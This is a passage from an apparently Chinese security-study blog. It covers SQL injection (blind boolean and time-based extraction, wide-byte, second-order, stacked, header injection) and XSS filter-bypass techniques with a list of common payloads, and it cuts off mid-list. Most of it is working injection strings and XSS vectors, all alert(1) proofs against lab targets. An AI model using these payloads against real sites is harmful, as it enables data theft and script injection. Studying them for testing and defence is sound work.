class="number">103</span>#</span><br></pre></td></tr></table></figure></li></ol><h4 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h4><ol><li>猜解字段数量<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">3</span>#</span><br></pre></td></tr></table></figure></li><li>猜解字段长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">7</span># 猜解第一个字段长度</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">7</span># 猜解第一个字段长度</span><br></pre></td></tr></table></figure></li><li>猜解字段名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span># 第一个字段的第一个字符</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span># 第一个字段的第二个字符</span><br></pre></td></tr></table></figure></li><li>猜解数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dvwa.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03-时间盲注"><a href="#0x03-时间盲注" class="headerlink" title="0x03 时间盲注"></a>0x03 时间盲注</h3><p>无错误回显，主要利用sleep()使得mysql执行时间变长，由回显时间来判断是否报错</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><ol><li>猜解库名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;=</span><span class="number">8</span>,sleep(<span class="number">2</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解列名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x04-二次注入"><a href="#0x04-二次注入" class="headerlink" title="0x04 二次注入"></a>0x04 二次注入</h3><p>攻击者将恶意数据存储插入数据库后，恶意数据被读取并进入SQL语句中执行。当在一个注入点插入数据时，数据会被转义，无法触发注入，转义后的数据被插入数据库，此时数据又被还原了，若此时在另一个注入点引用数据，则将会触发注入。</p><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><ul><li>插入数据时服务端对数据进行了转义，如使用mysql_escape_string、mysql_real_escape_string等函数</li><li>能够读取该数据</li></ul><h3 id="0x05-宽字节注入"><a href="#0x05-宽字节注入" class="headerlink" title="0x05 宽字节注入"></a>0x05 宽字节注入</h3><p>宽字节是指GB2312、GBK、BIG5、GB18030、Shift_JIS等两字节编码的字节，而宽字节引发的安全问题在于“吞”ASCII字符，即在编码时将两个ASCII字符认为是一个宽字符。在GBK编码中，若第一个字节的ASCII大于127，则就会将此字符和其紧随后面的一个字符当作一个汉字，那么后面这个字符就被“吞”了</p><h4 id="宽字节示例"><a href="#宽字节示例" class="headerlink" title="宽字节示例"></a>宽字节示例</h4><p>在PHP中常常使用转义函数来处理输入，如：addslashes()、mysql_real_escape_string()、mysql_escape_string()等。<br>addslashes()会危险字符前加上反斜杠()来转义，比如单引号(‘)，经过addslashes()处理后变为(&#39;)，单引号失效了，这样就不能触发注入了。但是如果通过在要被转义的字符前加上ASCII值大于127的字符，那么就能绕过此种过滤。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="operator">%</span>df<span class="string">&#x27;</span></span><br><span class="line"><span class="string">--经过addslashes()处理-&gt;</span></span><br><span class="line"><span class="string">id=%d5%5c&#x27;</span></span><br><span class="line"><span class="comment">--GBK解码--&gt;</span></span><br><span class="line">id<span class="operator">=</span>誠<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="0x06-堆叠注入"><a href="#0x06-堆叠注入" class="headerlink" title="0x06 堆叠注入"></a>0x06 堆叠注入</h3><p>通过分号分隔多条SQL语句，使得一次query可以执行多条SQL语句</p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>PHP中mysql_multi_query()函数支持多条语句执行，但是为防止SQL注入，常使用mysql_query()函数，该函数仅能执行一条语句，分号后面的语句将不会被执行</p><h3 id="0x07-HTTP头部注入"><a href="#0x07-HTTP头部注入" class="headerlink" title="0x07 HTTP头部注入"></a>0x07 HTTP头部注入</h3><p>在Web应用中，HTTP头部一些字段与数据库有交互，如HOST、X-Forwarded-For、User-Agent、Referer、Cookie、Client-IP等，通过这些可控输入，即可构造SQL语句造成SQL注入攻击</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/article/68bdea49.html"/>
      <url>/article/68bdea49.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-过滤-绕过技巧"><a href="#0x00-过滤-绕过技巧" class="headerlink" title="0x00 过滤-绕过技巧"></a>0x00 过滤-绕过技巧</h3><p>1.圆括号被过滤</p><p>反引号替换圆括号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.圆括号与反引号被过滤</p><p>svg标签+ html编码</p><p>浏览器解码顺序：html解码-js解码-url解码</p><p>原本html解码是无法进入到script标签里面去的，但是在外面套一个svg标签就能够对svg包裹下的数据进行html解码，相关原理在此文章中有详细解释（XSS进行Bypass的重要内容）</p><p><a href="http://cn-sec.com/archives/247823.html">通过浏览器编码深入探究XSS绕过</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt;</span><br><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>3.通过包裹注释符过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于结束注释符–&gt;被过滤，无法完成闭合，可使用–!&gt;来充当结束注释符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt;</span><br><span class="line">--!&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>4.对属性onmouseover、onerror等进行过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处过滤了以auto或on开头并且以&#x3D;或&gt;结尾的属性，且不区分大小写。这里需要用到Javascript语句结束符的知识。</p><p>Javascript解析引擎特性：Javascript通常以分号结尾，如果引擎确定一条语句是完整的，并且行尾有换行符，则分号可省略；如果语句不完整，则引擎会继续向后处理，直到语句完整或出现分号结束。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">或者</span><br><span class="line">type=<span class="string">&quot;image&quot;</span> src=x onerror</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>5.将尖括号及其包裹的全部过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用不需要右尖括号进行的闭合的标签绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">&lt;body onload=<span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><p>支持onload事件弹窗的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;iframe onload=alert(1)&gt;</span><br><span class="line">&lt;style onload=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>知此恨onerror事件弹窗的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;input type=&quot;image&quot; src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;script src=x onerror=alert(1)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>6.某个标签被过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>style结束标签被过滤了，需要它来进行闭合，可使用双写、空格、换行、制表符来绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style&lt;/</span>style&gt;&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">或者</span><br><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;/style</span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">或者</span><br><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>7.输入转成大写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可通过html编码来绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=x onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>8.单行注释过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过换行绕过单行注释，并通过结束注释符注释掉后面的语句。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br><span class="line"><span class="comment">//这里&lt;被过滤了，否则&lt;!--与--&gt;都可以注释js语句</span></span><br></pre></td></tr></table></figure><p>9.&lt;+字母被过滤了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意味着正常的标签都无法使用，这里有个特殊的情况，即拉丁文小写字母长S:ſ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>10.html转义过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，该函数将一些字符进行了html转义。其实这样的转义毫无意义，因为浏览器会先进行html反转义，然后html解析，然后才是js解析,所以该闭合闭合。详细原理见2中提到的文章。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1)&lt;!--</span></span><br></pre></td></tr></table></figure><p>11.转义双引号造成无法闭合</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过转义转义符来闭合，并通过堆叠来构造弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">&quot;);alert(1)&lt;!--</span></span><br><span class="line"><span class="string">/&quot;</span>);<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>三种弹窗事件(可互相替换)：alert(),prompt(),confirm()</p><h3 id="0x01-常用Payload"><a href="#0x01-常用Payload" class="headerlink" title="0x01 常用Payload"></a>0x01 常用Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=x onerror=eval(alert(1))&gt;</span><br><span class="line">&lt;img src=https: onmouseover=alert(1)&gt;</span><br><span class="line">&lt;img src=https: onclick=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">空格被过滤：</span><br><span class="line">(斜杠/代替)</span><br><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(1)&gt;</span><br><span class="line">(回车符%0d或换行符%0a代替)</span><br><span class="line">&lt;img%0asrc=&quot;x&quot;%0dalert(1)&gt;</span><br><span class="line"></span><br><span class="line">IE6.0 | IE7.0 有效：</span><br><span class="line">&lt;img src=javascript:alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;URL&quot; style=&quot;xss:expression(alert(1))&quot;&gt;</span><br><span class="line">&lt;img style=&quot;background-image:url(javascript:alert(1))&quot;&gt;</span><br><span class="line">&lt;img style=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="number">1</span>))&gt;aa</span><br><span class="line">&lt;a onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line">&lt;a onclick=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line"><span class="title class_">Base64</span>编码(<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>): &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;aa</span><br><span class="line">Html实体编码(javascript:alert(1)): &lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;aa</span><br><span class="line">Url全字符编码(&lt;script&gt;alert(1)&lt;/script&gt;): &lt;a href=data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&gt;aa</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;</span><br><span class="line">&lt;iframe src=data:text/html,&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br><span class="line">&lt;iframe src=data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&gt;</span><br><span class="line">&lt;iframe src=vbscript:msgbox(1)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;input onclick=alert(1)&gt;</span><br><span class="line">&lt;input type=image src onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">当input标签被设置hidden属性时：</span><br><span class="line"></span><br><span class="line">使用expression绕过：&lt;input type=&quot;hidden&quot; style=&quot;x:expression(alert(1))&quot;&gt;</span><br><span class="line">使用accesskey绕过：&lt;input type=&quot;hidden&quot; accesskey=&quot;x&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">在script标签前加上svg标签，这样就能够对script标签内部的实体字符编码进行<span class="title class_">Html</span>解码</span><br><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span 